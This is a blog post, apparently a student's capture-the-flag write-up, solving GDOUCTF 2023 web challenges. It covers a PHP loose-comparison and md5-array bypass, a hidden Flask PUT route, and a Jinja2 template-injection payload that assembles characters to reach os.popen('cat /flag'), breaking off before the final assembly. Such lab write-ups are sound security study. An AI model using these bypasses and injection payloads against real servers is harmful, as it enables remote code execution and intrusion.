<!DOCTYPE html>
<html lang=zh-CN>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。">
    <meta property="og:type" content="website">
    <meta name="description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。">
    <meta name="keyword"  content="">
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        GDOUCTF 2023 - n0rt6&#39;s bolg
        
    </title>

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/aircloud.css">

    
<link rel="stylesheet" href="/css/gitment.css">

    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>

    









<meta name="generator" content="Hexo 6.3.0"></head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i> Welcome To You </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/img/avatar.jpg" />
        </div>
        <div class="name">
            <i>n0rt6</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/collect/">
                    <i class="iconfont icon-shoucang1"></i>
                    <span>COLLECT</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hate-eat-snake"><span class="toc-text">hate eat snake</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%97%E4%B8%8D%E4%BA%86%E4%B8%80%E7%82%B9"><span class="toc-text">受不了一点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-WEB"><span class="toc-text">EZ WEB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85"><span class="toc-text">泄露的伪装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F"><span class="toc-text">反方向的钟</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-bg" id="search-bg"></div>
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> Welcome To You </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        GDOUCTF 2023
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2023-04-17 21:41:07</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#ctf" title="ctf">ctf</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <meta name="referrer" content="no-referrer"/>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h3><p><strong>JS</strong><br><img src="https://img-blog.csdnimg.cn/83a1d5e00991490b8df76fbf9ff9b211.png" alt="1"><br>像遇到游戏题目常规思路就是F12改数据或者调试，本题也一样。由于本题游戏过程中速度会越来越快，在js代码中寻找speed的逻辑。<br><img src="https://img-blog.csdnimg.cn/17ccc8f0652c48a4936ccf77acc9ec2a.png" alt="2"><br>调试一下改为**this.speed;**然后然他运行一段时间就得到flag。<br><img src="https://img-blog.csdnimg.cn/17dfe7a150b248e5bae600152eb3f4be.png" alt="2"></p>
<h3 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h3><p><strong>审计代码</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'j0k3r'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                  <span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                  <span class="token variable">$bbb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$bbb</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$aaa</span><span class="token operator">!=</span><span class="token variable">$bbb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                   <span class="token variable">$give</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cancanwordflag'</span><span class="token punctuation">;</span>
                   <span class="token variable">$get</span> <span class="token operator">=</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">;</span>
                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$give</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
                   <span class="token punctuation">&#125;</span>
                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                         <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"洗洗睡吧"</span><span class="token punctuation">;</span>
                 <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"行不行啊细狗"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'菜菜'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"就这?"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"别来沾边"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>层层绕过。<br>GET<br><code>?aaa=114514a&amp;bbb=114514b&amp;a=flag&amp;flag=a</code><br>POST<br><code>gdou[]=1&amp;ctf[]=2</code><br>COOKIE<br><code>cookie=j0k3r</code><br><img src="https://img-blog.csdnimg.cn/4a2c6f2e48e24be696a551a8aa9ca7fc.png" alt="3"></p>
<h3 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h3><p><strong>源码泄露</strong><br>查看源码<br><img src="https://img-blog.csdnimg.cn/a8e1c77c98894795bc9d1f5ebfbc0d8e.png" alt="3"><br>访问&#x2F;src下载源码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> flask

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_file<span class="token punctuation">(</span><span class="token string">'app.py'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/super-secret-route-nobody-will-guess'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'PUT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问<code>/super-secret-route-nobody-will-guess</code>burp抓包GET改为PUT得到flag。<br><img src="https://img-blog.csdnimg.cn/f428cefb45aa4c01abc3e53ba9b68ffc.png" alt="5"></p>
<h3 id=""><a href="#" class="headerlink" title=""></a><ez_ze></h3><p><strong>python框架jinja2 SSTI漏洞</strong><br>有学习价值。<br><img src="https://img-blog.csdnimg.cn/0c4046d1d8424ffba759b0ee71cfc198.png" alt="6"></p>
<p><code>报错出框架，使用&#123;&#123;&#125;&#125;不行，看来过滤了很多东西。</code></p>
<p><img src="https://img-blog.csdnimg.cn/d8a9ca545e6d41df9e13375ff8a2a8f4.png" alt="6"><br><img src="https://img-blog.csdnimg.cn/c5d8870ec29a4b3599c606cbff32dca9.png" alt="7"><br><img src="https://img-blog.csdnimg.cn/106cfa10d2934b5887fc065029a1886f.png" alt="8"><br>成功执行。FUZZ测试一下过滤了哪些字符<br><img src="https://img-blog.csdnimg.cn/6799efdd8ebf402abcbf0bce782a6c80.png" alt="9"></p>
<blockquote>
<p>过滤字符如上。</p>
</blockquote>
<p>参考博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/129856818">绕过姿势</a><br>先把数字全给获取了。<br><img src="https://img-blog.csdnimg.cn/b1e9d4878b3142b1a1155b16fc9ee167.png" alt="1"><br>然后开始<strong>拼接payload</strong><br>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/130186511">wp</a>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 首先构造出所需的数字: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> zero <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 0, 也可以使用lenght过滤器获取数字</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> one <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">**</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 1</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> two <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 2</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> four <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 4</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> five <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token punctuation">)</span><span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 5</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> three <span class="token operator">=</span> five<span class="token operator">-</span>one<span class="token operator">-</span>one <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 3</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> nine <span class="token operator">=</span> <span class="token punctuation">(</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">*</span>two<span class="token operator">-</span>five<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 9</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> seven <span class="token operator">=</span> <span class="token punctuation">(</span>zero<span class="token operator">-</span>one<span class="token operator">-</span>one<span class="token operator">-</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">abs</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 7</span>

<span class="token comment"># 构造出所需的各种字符与字符串: </span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> space <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 空格</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point <span class="token operator">=</span> self<span class="token operator">|</span><span class="token builtin">float</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">min</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># .</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> c <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>c<span class="token operator">=</span>aa<span class="token punctuation">)</span><span class="token operator">|</span>reverse<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 字符 c</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfh <span class="token operator">=</span> self<span class="token operator">|</span>string<span class="token operator">|</span>urlencode<span class="token operator">|</span>first <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 百分号 %</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bfhc <span class="token operator">=</span> bfh<span class="token operator">~</span>c <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> slas <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>seven<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造斜杠 /</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> yin <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>three<span class="token operator">~</span>nine<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造引号 '</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> xhx <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nine<span class="token operator">~</span>five<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造下划线 _</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> right <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>one<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造右括号 )</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> left <span class="token operator">=</span> bfhc<span class="token operator">%</span><span class="token punctuation">(</span><span class="token punctuation">(</span>four<span class="token operator">~</span>zero<span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># 使用%c构造左括号 (</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> but <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>buil<span class="token operator">=</span>aa<span class="token punctuation">,</span>tins<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> imp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>aa<span class="token punctuation">,</span>ort<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># import</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pon <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>aa<span class="token punctuation">,</span>pen<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># popen</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> so <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># os</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ca <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ca<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># cat</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> l <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>l<span class="token operator">=</span>aa<span class="token punctuation">,</span>s<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>           <span class="token comment">#ls     //&#123;%%0cset%0cls%0c=%0cdict(l=aa,s=dd)|join%0c%&#125;</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> flg <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>fl<span class="token operator">=</span>aa<span class="token punctuation">,</span>ag<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># flag</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ev <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ev<span class="token operator">=</span>aa<span class="token punctuation">,</span>al<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> red <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>re<span class="token operator">=</span>aa<span class="token punctuation">,</span>ad<span class="token operator">=</span>dd<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># read</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> bul <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>but<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># __builtins__</span>

<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> ini <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ini<span class="token operator">=</span>aa<span class="token punctuation">,</span>t<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># init</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> glo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>glo<span class="token operator">=</span>aa<span class="token punctuation">,</span>bals<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>
<span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> itm <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ite<span class="token operator">=</span>aa<span class="token punctuation">,</span>ms<span class="token operator">=</span>bb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># items</span>

<span class="token comment"># 将上面构造的字符或字符串拼接起来构造出 __import__('os').popen('cat /flag').read(): </span>
